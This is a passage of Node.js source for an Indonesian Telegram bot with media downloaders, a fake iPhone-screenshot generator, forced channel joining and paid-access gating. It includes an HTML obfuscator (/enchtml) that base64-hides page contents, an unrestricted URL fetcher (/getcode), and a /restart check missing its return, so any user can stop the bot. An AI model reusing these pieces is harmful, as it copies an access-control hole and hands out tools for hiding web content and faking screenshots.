    const battery = args[1];
    const message = args.slice(2).join(" ");

    iqcSessions[chatId] = { time, battery, message };

    await bot.sendMessage(chatId, "Pilih Provider", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Axis", callback_data: "iqc_provider_Axis" },
            { text: "Telkomsel", callback_data: "iqc_provider_Telkomsel" }
          ],
          [
            { text: "Indosat", callback_data: "iqc_provider_Indosat" },
            { text: "IM3", callback_data: "iqc_provider_IM3" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("Failed /iqc:", err.message);
    bot.sendMessage(chatId, "Terjadi kesalahan saat memproses IQC.");
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  try {
    if (!query.data.startsWith("iqc_provider_")) return;

    const provider = query.data.replace("iqc_provider_", "");
    const data = iqcSessions[chatId];

    if (!data) {
      return bot.sendMessage(chatId, "Data IQC tidak ditemukan. Jalankan command /iqc lagi.");
    }

    const { time, battery, message } = data;
    await bot.answerCallbackQuery(query.id, { text: "Diproses..." });
    await bot.sendMessage(chatId, "Sedang membuat gambar...");

    const apiUrl = `https://joocode.zone.id/api/iqc?t=${encodeURIComponent(
      time
    )}&b=${encodeURIComponent(battery)}&m=${encodeURIComponent(
      message
    )}&p=${encodeURIComponent(provider)}`;

    await bot.sendPhoto(chatId, apiUrl, {
      caption: "✅ ⵢ SsIphone By 𝐕𝐚𝐧𝐭𝐡𝐚𝐫𝐚 ( 🕷️ )",
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("ERROR callback_query:", err.message);
    bot.sendMessage(chatId, "Gagal generate IQC.");
  }
});

bot.onText(/^\/restart/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://DarlinNyc" }]
        ]
      }
    });
  }
  await bot.sendMessage(chatId, "Succes Restart Bot");
  setTimeout(() => process.exit(0), 1000);
});

const OWNER_ID = config.OWNER_ID

const forcedChannels = {
enabled: false,
channels: []
}

bot.onText(/^\/channel(?: (.+))?$/i, async (msg, match) => {
try {

const chatId = msg.chat.id
const userId = msg.from.id

if (!isOwner(userId)) {
return bot.sendMessage(chatId, `
<blockquote>❌ Command ini khusus owner</blockquote>
`, {
parse_mode: "HTML"
})
}

const input = match[1]

if (!input) {
return bot.sendMessage(chatId, `
<blockquote>
📢 AUTO JOIN CHANNEL

Status : ${forcedChannels.enabled ? "ON" : "OFF"}

Channel :
${forcedChannels.channels.length
? forcedChannels.channels.map((v, i) => `${i + 1}. ${v}`).join("\n")
: "Belum ada channel"}

━━━━━━━━━━━━━━━━━━

Cara Pakai :

/channel on
/channel off

/channel @channel1
/channel @channel1, @channel2
/channel @channel1, @channel2, @channel3
</blockquote>
`, {
parse_mode: "HTML"
})
}

if (input.toLowerCase() === "on") {

forcedChannels.enabled = true

return bot.sendMessage(chatId, `
<blockquote>
✅ Auto join berhasil di aktifkan
</blockquote>
`, {
parse_mode: "HTML"
})
}

if (input.toLowerCase() === "off") {

forcedChannels.enabled = false

return bot.sendMessage(chatId, `
<blockquote>
❌ Auto join berhasil di nonaktifkan
</blockquote>
`, {
parse_mode: "HTML"
})
}

let channels = input
.split(",")
.map(v => v.trim())
.filter(v => v.startsWith("@"))

if (channels.length > 3) {
return bot.sendMessage(chatId, `
<blockquote>
❌ Maksimal hanya 3 channel
</blockquote>
`, {
parse_mode: "HTML"
})
}

forcedChannels.channels = channels

bot.sendMessage(chatId, `
<blockquote>
✅ Channel berhasil di set

${channels.map((v, i) => `${i + 1}. ${v}`).join("\n")}
</blockquote>
`, {
parse_mode: "HTML"
})

} catch (e) {
console.log(e)
}
})

async function checkJoined(userId) {
try {

if (!forcedChannels.enabled) return true
if (forcedChannels.channels.length < 1) return true

for (let ch of forcedChannels.channels) {

let member = await bot.getChatMember(ch, userId)

let status = member.status

if (
status !== "member" &&
status !== "administrator" &&
status !== "creator"
) {
return false
}

}

return true

} catch (e) {
console.log(e)
return false
}
}

async function sendJoinMessage(chatId) {

let buttons = forcedChannels.channels.map(ch => {
return [{
text: `JOIN ${ch.replace("@", "").toUpperCase()}`,
url: `https://azharnakmakan${ch.replace("@", "")}`
}]
})

buttons.push([
{
text: "✅ VERIFIKASI",
callback_data: "verify_join"
}
])

return bot.sendMessage(chatId, `
<blockquote>
❌ AKSES DITOLAK

Kamu wajib join seluruh channel terlebih dahulu untuk menggunakan bot ini.

Silahkan join semua channel lalu tekan tombol verifikasi.
</blockquote>
`, {
parse_mode: "HTML",
reply_markup: {
inline_keyboard: buttons
}
})
}

bot.on("callback_query", async (q) => {
try {

if (q.data !== "verify_join") return

const userId = q.from.id
const chatId = q.message.chat.id

let joined = await checkJoined(userId)

if (!joined) {
return bot.answerCallbackQuery(q.id, {
text: "❌ Kamu belum join semua channel",
show_alert: true
})
}

bot.answerCallbackQuery(q.id, {
text: "✅ Verifikasi berhasil"
})

bot.editMessageText(`
<blockquote>
✅ Verifikasi berhasil

Sekarang kamu sudah bisa menggunakan bot.
</blockquote>
`, {
chat_id: chatId,
message_id: q.message.message_id,
parse_mode: "HTML"
})

} catch (e) {
console.log(e)
}
})


bot.onText(/^\/tiktokdl(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1]?.trim();

  if (!args)
    return bot.sendMessage(
      chatId,
      "❌ ⵢ Format: /tiktokdl https://example.com/"
    );

  let url = args;

  if (msg.entities) {
    for (const e of msg.entities) {
      if (e.type === "url") {
        url = msg.text.substring(e.offset, e.offset + e.length);
        break;
      }
    }
  }

  const wait = await bot.sendMessage(chatId, "Process Download Media Tiktok");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return bot.sendMessage(chatId, "❌ ⵢ Gagal ambil data video, pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = [];

      for (const img of imgs) {
        const res = await axios.get(img, { responseType: "arraybuffer" });
        media.push({
          type: "photo",
          media: { source: Buffer.from(res.data) }
        });
      }

      await bot.sendMediaGroup(chatId, media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl)
      return bot.sendMessage(chatId, "❌ ⵢ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await bot.sendVideo(
      chatId,
      Buffer.from(video.data),
      { supports_streaming: true },
      { filename: `${d.id || Date.now()}.mp4` }
    );
  } catch (e) {
    const errMsg = e?.response?.status
      ? `❌ ⵢ Error ${e.response.status} saat mengunduh video`
      : "❌ ⵢ Gagal mengunduh, koneksi lambat atau link salah";
    await bot.sendMessage(chatId, errMsg);
  } finally {
    try {
      await bot.deleteMessage(chatId, wait.message_id);
    } catch {}
  }
});

const sesi = {}

async function getTrack(query) {
  const url = `https://api.nekolabs.web.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`
  const res = await axios.get(url)
  return res.data.result
}

bot.onText(/^\/play(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id
  const query = match[1]

  if (!query) {
    return bot.sendMessage(chatId, "❌ ⵢ Format: /play judul lagu")
  }

  sesi[chatId] = {
    musicList: [],
    index: 0
  }

  try {
    const result = await getTrack(query)
    sesi[chatId].musicList.push(result)
    sendMusicCard(chatId)
  } catch {
    bot.sendMessage(chatId, "❌ ⵢ Lagu tidak ditemukan.")
  }
})

bot.on("callback_query", async (cb) => {
  const chatId = cb.message.chat.id
  const action = cb.data

  const session = sesi[chatId]
  if (!session || session.musicList.length === 0) {
  return bot.answerCallbackQuery(cb.id, { text: "‎ " })
  }

  const d = session.musicList[session.index]

  if (action === "music_play") {
    await bot.answerCallbackQuery(cb.id)
    return bot.sendAudio(chatId, d.downloadUrl, {
      title: d.metadata.title,
      performer: d.metadata.artist
    })
  }

  if (action === "music_lyrics") {
    await bot.answerCallbackQuery(cb.id)
    try {
      const lyr = await axios.get(
        `https://api.deline.web.id/tools/lyrics?title=${encodeURIComponent(d.metadata.title)}`
      )
      return bot.sendMessage(
        chatId,
        lyr.data.result?.[0]?.plainLyrics || "❌ ⵢ Lirik tidak ditemukan."
      )
    } catch {
      return bot.sendMessage(chatId, "❌ ⵢ Error mengambil lirik.")
    }
  }
})

function sendMusicCard(chatId) {
  const session = sesi[chatId]
  const d = session.musicList[session.index]
  const meta = d.metadata

  const caption = `🎵 Song Name *${meta.title}*
👤 Artist : ${meta.artist}
⏱ Duration : ${meta.duration}
`

  bot.sendPhoto(chatId, meta.cover, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎧 Play", callback_data: "music_play" }],
        [{ text: "🔤 Lyrics", callback_data: "music_lyrics" }]
      ]
    }
  })
}

bot.onText(/^\/instagramdl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const q = match[1]

  if (!q) return bot.sendMessage(chatId, "❌ ⵢ Format: /instagramdl <url>")

  bot.sendMessage(chatId, "🕑 ⵢ Process Download media...")

  const api = `https://api.nekolabs.web.id/downloader/instagram?url=${encodeURIComponent(q)}`

  try {
    const r = await axios.get(api, { timeout: 15000 })
    if (!r.data || !r.data.success) return bot.sendMessage(chatId, "❌ ⵢ Gagal mengambil data")

    const list = r.data.result.downloadUrl

    if (!Array.isArray(list) || list.length === 0) return bot.sendMessage(chatId, "❌ ⵢ Media tidak ditemukan")

    for (const media of list) {
      if (media.endsWith(".mp4")) {
        await bot.sendVideo(chatId, media)
      } else {
        await bot.sendPhoto(chatId, media)
      }
    }

  } catch (e) {
    console.log("Err IG:", e.message)
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan, coba lagi")
  }
})

bot.onText(/^\/facebookdl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const text = match[1]

  if (!text) return bot.sendMessage(chatId, "❌ ⵢ Format: /facebookdl <url>")

  const wait = await bot.sendMessage(chatId, "🕑 ⵢ Process Download Media...")

  try {
    const api = `https://api.nekolabs.web.id/downloader/facebook?url=${encodeURIComponent(text)}`
    const res = await axios.get(api)
    const result = res.data.result

    if (!result || !result.medias || result.medias.length === 0) {
      await bot.deleteMessage(chatId, wait.message_id)
      return bot.sendMessage(chatId, "❌ ⵢ Tidak ada media ditemukan.")
    }

    for (const m of result.medias) {
      if (m.type === "image") {
        await bot.sendPhoto(chatId, m.url)
      } else if (m.type === "video") {
        await bot.sendVideo(chatId, m.url)
      }
    }

    await bot.deleteMessage(chatId, wait.message_id)
  } catch (e) {
    try { await bot.deleteMessage(chatId, wait.message_id) } catch {}
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan.")
  }
})

bot.onText(/^\/gconly(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
    if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://t.me/DarlinNyc" }]
        ]
      }
    });
  }
  const args = (match[1] || "").trim();
  if (!args || !/(on|off)/i.test(args)) {
    return bot.sendMessage(chatId, "❌ ⵢ Format: /gconly on | off");
  }
  const mode = args.toLowerCase();
  const status = mode === "on";
  setGroupOnly(status);
  bot.sendMessage(chatId, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/cekid$/i, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;
  const firstName = user.first_name || "";
  const lastName = user.last_name || "";
  const userId = user.id;
  try {
    const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
    const fileId = photos.photos[0][0].file_id;
    const text = `<b>User Info :</b>\n<b>USERNAME :</b> ${user.username ? '@' + user.username : 'Tidak ada'}\n<b>ID TELEGRAM:</b> <code>${userId}</code>`;
    bot.sendPhoto(chatId, fileId, {
      caption: text,
      parse_mode: "HTML",
      reply_to_message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: `${firstName} ${lastName}`, url: `tg://user?id=${userId}` }]
        ]
      }
    });
  } catch (e) {
    bot.sendMessage(chatId, `<b>ID :</b> <code>${userId}</code>`, { parse_mode: "HTML", reply_to_message_id: msg.message_id });
  }
});

bot.onText(/^\/pinterest(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match && match[1]) ? match[1].trim() : "";
  if (!query) return bot.sendMessage(chatId, "❌ ⵢ Format : /pinterest Butterfly");
  try {
    const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;
    const res = await axios.get(apiUrl, { timeout: 15000 });
    const data = res.data;
    if (!data || !data.result || data.result.length === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ No Pinterest images found for your query.");
    }
    await bot.sendPhoto(chatId, data.result[0], { caption: `📌 Pinterest Result for: *${query}*`, parse_mode: "Markdown" });
  } catch (e) {
    bot.sendMessage(chatId, "❌ ⵢ Error fetching Pinterest image. Please try again later.");
  }
});


bot.onText(/^\/tofigure$/i, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  if (!reply || !reply.photo) return bot.sendMessage(chatId, "❌ ⵢ Format : Reply Image With Caption /tofigure.");
  await bot.sendMessage(chatId, "🕑 ⵢ Process Tofigure");
  try {
    const photo = reply.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await bot.getFile(fileId);
    const telegramUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
    const apiUrl = `https://api.elrayyxml.web.id/api/ephoto/figure?url=${encodeURIComponent(telegramUrl)}`;
    const result = await axios.get(apiUrl, { responseType: "arraybuffer", timeout: 30000 });
    await bot.sendPhoto(chatId, Buffer.from(result.data), { caption: "✅ ⵢ Tofigure By 𝐕𝐚𝐧𝐭𝐡𝐚𝐫𝐚 ( 🍁 )" });
  } catch (e) {
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan." + (e.message || ""));
  }
});

bot.onText(/\/tourl/i, async (msg) => {
  const chatId = msg.chat.id;
  const repliedMsg = msg.reply_to_message;

  if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
    return bot.sendMessage(chatId, "❌ ⵢ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    const photos = repliedMsg.photo;
    fileId = photos[photos.length - 1].file_id;
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox..."); 

    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: fileName,
      contentType: response.headers["content-type"] || "application/octet-stream",
    });

    const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    if (!catboxUrl.startsWith("https://")) {
      throw new Error("Catbox tidak mengembalikan URL yang valid");
    }

    await bot.editMessageText(`✅ ⵢ Tourl By 𝐕𝐚𝐧𝐭𝐡𝐚𝐫𝐚 ( 🕷️ )\n📎 URL: ${catboxUrl}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
    });

  } catch (error) {
    console.error("Upload error:", error?.response?.data || error.message);
    bot.sendMessage(chatId, "❌ ⵢ Gagal mengupload file ke Catbox");
  }
});

bot.onText(/\/getcode (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const userId = msg.from.id;
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://t.me/DarlinNyc" }]
        ]
      }
    });
  }
  
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "❌ ⵢ Format :  /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ ⵢ Get Code By 𝐕𝐚𝐧𝐭𝐡𝐚𝐫𝐚 ( 🕷️ ) ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "Error" + err);
  }
});

bot.onText(/\/enchtml(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from?.id;

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ ⵢ Please Reply File .html");
  }

  try {
    const fileId = msg.reply_to_message.document.file_id;
    const fileInfo = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = global.Buffer.from(response.data).toString("utf8");

    const encoded = global.Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>mbape</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    const outputPath = path.join(__dirname, "encrypted.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await bot.sendDocument(chatId, outputPath, {
      caption: "✅ ⵢ Enc Html By 𝐕𝐚𝐧𝐭𝐡𝐚𝐫𝐚 ( 🕷️ )"
    });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ ⵢ Error Saat Membuat Sticker");
  }
});
